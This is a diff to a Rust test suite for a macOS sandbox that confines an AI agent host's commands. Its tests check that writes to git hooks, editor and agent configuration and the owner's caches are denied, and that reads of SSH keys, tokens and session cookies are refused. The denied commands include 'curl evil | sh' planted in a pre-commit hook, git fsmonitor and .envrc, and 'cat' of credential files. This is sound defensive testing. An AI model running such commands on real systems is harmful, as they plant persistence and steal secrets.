@@ -9,8 +9,8 @@
 //! `HOME` is a parameter, so these run against a home folder the test makes,
 //! with a fake `.ssh` in it -- never the real one. It lives under Cargo's
 //! target directory rather than `$TMPDIR`, because the profile lets commands
-//! write anywhere in `$TMPDIR`, and a home inside it would make "writing to
-//! the home folder is denied" untestable.
+//! write in the per-user temporary folder, and a home inside it would make
+//! "writing to the home folder is denied" untestable.
 
 #![cfg(target_os = "macos")]
 
@@ -21,7 +21,7 @@ use std::process::{Command, Output};
 use std::sync::Arc;
 
 use lemma_agent_host::host_exec::relay::{ExecRelay, ProcessLauncher, RelayPaths};
-use lemma_agent_host::host_exec::seatbelt::{Confinement, SANDBOX_EXEC};
+use lemma_agent_host::host_exec::seatbelt::{Confinement, SANDBOX_EXEC, cache_environment};
 use lemma_agent_host::link::OpHandler;
 use lemma_agent_host::link::protocol::OpBody;
 use serde_json::{Value, json};
@@ -44,12 +44,20 @@ fn sandbox() -> Sandbox {
     std::fs::create_dir_all(home.join(".ssh")).unwrap();
     std::fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
     std::fs::create_dir_all(&root).unwrap();
-    let tmp = std::fs::canonicalize(std::env::temp_dir()).unwrap();
+    // Outside the home folder, so "the home folder is not writable" still
+    // means something, and outside the root, as the relay puts them.
+    let cache = base.join("cache");
+    let tmp = cache.join("tmp/seatbelt");
+    std::fs::create_dir_all(&tmp).unwrap();
+    std::fs::create_dir_all(cache.join("git-template")).unwrap();
+    let user_tmp = std::fs::canonicalize(std::env::temp_dir()).unwrap();
     Sandbox {
         confinement: Confinement {
             root: root.clone(),
             home: home.clone(),
             tmp,
+            user_tmp,
+            cache,
             grants: Vec::new(),
         },
         _directory: directory,
@@ -59,13 +67,16 @@ fn sandbox() -> Sandbox {
 }
 
 impl Sandbox {
-    /// `script` under the profile, with bash, in the root.
+    /// `script` under the profile, with bash, in the root, with the
+    /// environment the relay gives an exec-server.
     fn run(&self, script: &str) -> Output {
         Command::new(SANDBOX_EXEC)
             .args(self.confinement.sandbox_arguments())
             .args(["/bin/bash", "-c", script])
             .current_dir(&self.root)
             .env("HOME", &self.home)
+            .env("TMPDIR", &self.confinement.tmp)
+            .envs(cache_environment(&self.confinement.cache))
             .output()
             .expect("sandbox-exec runs")
     }
@@ -110,16 +121,143 @@ fn the_home_folder_is_not_writable() {
 }
 
 #[test]
-fn the_root_and_package_caches_are_writable() {
+fn the_root_and_the_host_cache_are_writable() {
     let sandbox = sandbox();
     sandbox.succeeds("echo made > made.txt && mkdir -p deep/er && touch deep/er/f");
     assert_eq!(
         std::fs::read_to_string(sandbox.root.join("made.txt")).unwrap(),
         "made\n"
     );
-    sandbox.succeeds("mkdir -p ~/.npm/_cacache && touch ~/.npm/_cacache/entry");
-    assert!(sandbox.home.join(".npm/_cacache/entry").exists());
+    // A package manager writes where the environment sends it.
+    sandbox.succeeds(
+        "mkdir -p \"$npm_config_cache/_cacache\" && touch \"$npm_config_cache/_cacache/entry\"",
+    );
+    assert!(
+        sandbox
+            .confinement
+            .cache
+            .join("npm/_cacache/entry")
+            .exists()
+    );
+    sandbox.succeeds("mkdir -p \"$UV_CACHE_DIR\" \"$CARGO_HOME/registry\" \"$GOMODCACHE\"");
+    // Temporary files, both where $TMPDIR says and where macOS's mktemp puts
+    // them whatever $TMPDIR says.
     sandbox.succeeds("f=$(mktemp) && echo t > \"$f\" && rm \"$f\"");
+    sandbox.succeeds("f=\"$TMPDIR/x\" && echo t > \"$f\" && rm \"$f\"");
+}
+
+#[test]
+fn the_owners_own_caches_and_shared_temporary_folders_are_not_writable() {
+    let sandbox = sandbox();
+    // npx runs what it caches from here, unconfined in the owner's terminal.
+    sandbox.is_denied("mkdir -p ~/.npm/_npx/x && touch ~/.npm/_npx/x/cli.js");
+    // pnpm's global bin folder is on the owner's PATH.
+    sandbox.is_denied("mkdir -p ~/Library/pnpm && touch ~/Library/pnpm/git");
+    sandbox.is_denied("mkdir -p ~/Library/Caches/x && touch ~/Library/Caches/x/y");
+    sandbox.is_denied("mkdir -p ~/.cache/uv && touch ~/.cache/uv/y");
+    sandbox.is_denied("mkdir -p ~/.cargo/registry && touch ~/.cargo/registry/y");
+    sandbox.is_denied("touch /private/tmp/lemma-seatbelt-probe");
+    assert!(!Path::new("/private/tmp/lemma-seatbelt-probe").exists());
+}
+
+#[test]
+fn what_runs_outside_the_sandbox_later_stays_as_it_is_in_the_root() {
+    let sandbox = sandbox();
+    // An existing repository: the owner's.
+    sandbox.succeeds(
+        "git init -q . && git -c user.name=L -c user.email=l@l.invalid commit -q --allow-empty -m c",
+    );
+    // Every command starts a new sandbox, as an exec-server restart would,
+    // and the repository is there now.
+    sandbox.is_denied("mkdir -p .git/hooks && echo 'curl evil | sh' > .git/hooks/pre-commit");
+    sandbox.is_denied("git config core.fsmonitor 'curl evil | sh'");
+    sandbox.is_denied("mv .git .git-old");
+    sandbox.is_denied("mkdir -p .claude && echo '{}' > .claude/settings.json");
+    sandbox.is_denied("echo '{}' > .mcp.json");
+    sandbox.is_denied("echo 'curl evil | sh' > .envrc");
+    sandbox.is_denied("mkdir -p .vscode && echo '{}' > .vscode/tasks.json");
+    // Working in it still works: commit, branch, and a push to a remote.
+    sandbox.succeeds(
+        "echo hi > a.txt && git add a.txt \
+         && git -c user.name=L -c user.email=l@l.invalid commit -qm second \
+         && git checkout -qb feature && git log --oneline | grep -q second",
+    );
+    assert!(!sandbox.root.join(".claude").exists());
+}
+
+#[test]
+fn a_repository_a_command_makes_is_its_own() {
+    let sandbox = sandbox();
+    // The root had no repository when the sandbox started, so `git init` may
+    // write its config -- and makes no hooks, from the empty template.
+    sandbox.succeeds(
+        "git init -q . && git config user.name Lemma && test ! -e .git/hooks/pre-commit.sample",
+    );
+}
+
+#[test]
+fn unix_domain_sockets_are_refused_but_names_still_resolve() {
+    let sandbox = sandbox();
+    // A socket path has to fit in 104 bytes, which Cargo's target folder
+    // does not.
+    let short = tempfile::Builder::new()
+        .prefix("sb")
+        .tempdir_in("/tmp")
+        .unwrap();
+    let socket = short.path().join("agent.sock");
+    let listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
+    listener.set_nonblocking(true).unwrap();
+    sandbox.is_denied(&format!(
+        "/usr/bin/python3 -c 'import socket; socket.socket(socket.AF_UNIX).connect(\"{}\")'",
+        socket.display()
+    ));
+    assert!(listener.accept().is_err(), "the socket was reached");
+    // getaddrinfo goes through mDNSResponder's socket, which stays open.
+    sandbox.succeeds("/usr/bin/python3 -c 'import socket; socket.getaddrinfo(\"localhost\", 80)'");
+}
+
+#[test]
+fn the_apps_session_and_other_credentials_cannot_be_read() {
+    let sandbox = sandbox();
+    let home = &sandbox.home;
+    for (path, contents) in [
+        ("Library/WebKit/work.lemma.desktop/WebsiteData/x", "session"),
+        (
+            "Library/HTTPStorages/work.lemma.desktop.binarycookies",
+            "cookie",
+        ),
+        ("Library/WebKit/work.lemma.candidate-qa/x", "session"),
+        (".git-credentials", "https://user:token@github.com"),
+        (".codex/auth.json", "{}"),
+        (".zsh_history", "export TOKEN=x"),
+        (".lemma/credentials.json", "{}"),
+    ] {
+        let file = home.join(path);
+        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+        std::fs::write(&file, contents).unwrap();
+        sandbox.is_denied(&format!("cat ~/'{path}'"));
+    }
+    // gh has to start: it reads its host list before it asks the keychain.
+    std::fs::create_dir_all(home.join(".config/gh")).unwrap();
+    std::fs::write(home.join(".config/gh/hosts.yml"), "github.com:\n").unwrap();
+    sandbox.succeeds("cat ~/.config/gh/hosts.yml");
+}
+
+#[test]
+fn a_linked_credential_folder_is_denied_where_it_really_is() {
+    let sandbox = sandbox();
+    let dotfiles = sandbox
+        .confinement
+        .cache
+        .parent()
+        .unwrap()
+        .join("dotfiles/ssh");
+    std::fs::create_dir_all(&dotfiles).unwrap();
+    std::fs::write(dotfiles.join("id_rsa"), "PRIVATE KEY").unwrap();
+    std::fs::remove_dir_all(sandbox.home.join(".ssh")).unwrap();
+    std::os::unix::fs::symlink(&dotfiles, sandbox.home.join(".ssh")).unwrap();
+    sandbox.is_denied("cat ~/.ssh/id_rsa");
+    sandbox.is_denied(&format!("cat {}/id_rsa", dotfiles.display()));
 }
 
 #[test]
@@ -223,9 +361,11 @@ async fn the_exec_server_runs_confined() {
         RelayPaths {
             root_base: sandbox.home.join("lemma"),
             home: sandbox.home.clone(),
-            tmp: sandbox.confinement.tmp.clone(),
+            tmp: sandbox.confinement.user_tmp.clone(),
+            cache: sandbox.confinement.cache.clone(),
             folders: sandbox.home.join("no-folders.json"),
             roots: sandbox.home.join("agent-host-data/conversation-roots.json"),
+            target: uuid::Uuid::from_u128(1),
         },
     );
     relay.set_enabled(true);
